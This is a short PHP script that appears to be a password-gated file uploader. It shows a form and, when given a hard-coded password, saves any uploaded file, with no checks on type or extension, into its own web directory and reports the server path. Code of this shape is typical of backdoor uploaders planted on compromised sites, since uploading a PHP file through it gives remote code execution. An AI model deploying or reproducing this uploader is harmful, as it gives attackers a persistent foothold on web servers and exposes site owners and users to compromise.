<?php
$password = 'Qwertyuiop[]';

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['fileToUpload']) && isset($_POST['password'])) {
    if ($_POST['password'] === $password) {
        $target_file = basename($_FILES['fileToUpload']['name']);
        if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $target_file)) {
            echo "File " . htmlspecialchars($target_file) . " uploaded to " . __DIR__ . "/" . $target_file;
        } else {
            echo "Error uploading file.";
        }
    } else {
        echo "Incorrect password.";
    }
} else {
    echo "<form method='post' enctype='multipart/form-data'>
            <input type='password' name='password' placeholder='Enter Password'>
            <input type='file' name='fileToUpload'>
            <input type='submit' value='Upload File'>
          </form>";
}
?>
